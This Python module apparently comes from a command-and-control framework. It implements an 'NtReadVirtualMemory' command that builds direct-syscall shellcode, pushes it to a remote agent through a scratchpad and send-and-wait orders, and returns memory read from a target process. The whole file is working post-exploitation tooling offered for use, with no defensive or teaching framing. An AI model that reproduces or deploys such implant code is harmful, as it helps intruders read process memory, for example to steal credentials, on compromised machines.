NAME = "NtReadVirtualMemory"
DESCRIPTION = "Directly read memory from a target process using Ntdll syscall"
PARAMS = [
    {"name":"process_handle", "description":"Handle to the target process (usually -1 for self)", "type":"hex"},
    {"name":"base_address", "description":"Memory address to read from", "type":"hex"},
    {"name":"buffer_size", "description":"Number of bytes to read", "type":"int"}
]

def NtReadVirtualMemory_Shellcode(agent_id, process_handle, base_address, buffer_size):
    from models.agent import Agent
    from models.syscall import Syscall
    from services.binary import build_ptr, push_syscall
    
    agent = Agent.by_id(agent_id)
    syscall = Syscall.sys(agent.id, "NtReadVirtualMemory")
    scratchpad = agent.scratchpad
    
    # 1. Prepare buffer in scratchpad to receive the read data
    # We allocate space for the data + 8 bytes for NumberOfBytesRead (optional)
    read_buffer_data, num_bytes_read_ptr = build_ptr(scratchpad, b"\x00" * buffer_size)
    
    # Syscall Parameters (NTDLL Standard):
    # 1. HANDLE ProcessHandle
    # 2. PVOID BaseAddress (Remote address to read)
    # 3. PVOID Buffer (Local buffer in scratchpad to write into)
    # 4. SIZE_T BufferSize
    # 5. PSIZE_T NumberOfBytesRead (Optional return value)
    
    params = [
        process_handle,      # ProcessHandle
        base_address,        # BaseAddress
        scratchpad,          # Buffer (Our scratchpad address)
        buffer_size,         # BufferSize
        0                    # NumberOfBytesRead (NULL for simplicity)
    ]
    
    #printf"[*] NtReadVirtualMemory(Process={hex(process_handle)}, RemoteAddr={hex(base_address)}, LocalBuf={hex(scratchpad)}, Size={buffer_size})")
    
    shellcode = push_syscall(syscall, params, agent.debug)
    return read_buffer_data, shellcode

def readVirtualMemory(agent_id, process_handle, base_address, buffer_size):
    from services.orders import write_scratchpad, send_and_wait, read_scratchpad
    
    # 1. Generate the shellcode and prepare the scratchpad data blob
    data, shellcode = NtReadVirtualMemory_Shellcode(agent_id, process_handle, base_address, buffer_size)
    
    # 2. Write the empty buffer to the agent's scratchpad
    write_scratchpad(agent_id, data)
    
    # 3. Execute the syscall via the agent
    response = send_and_wait(agent_id, shellcode)
    ntstatus = int.from_bytes(response, 'little')
    
    # 4. Read the populated buffer back from the scratchpad
    read_content = read_scratchpad(agent_id, buffer_size)
    
    #printf"Response from NtReadVirtualMemory = {hex(ntstatus)}, bytes_read = {len(read_content)}")
    return ntstatus, read_content

def function(agent_id, args):
    # args[0]: process_handle, args[1]: base_address, args[2]: buffer_size
    retval, memory_content = readVirtualMemory(agent_id, args[0], args[1], args[2])
    
    return {
        "retval": retval, 
        "data": memory_content,
        "size": len(memory_content)
    }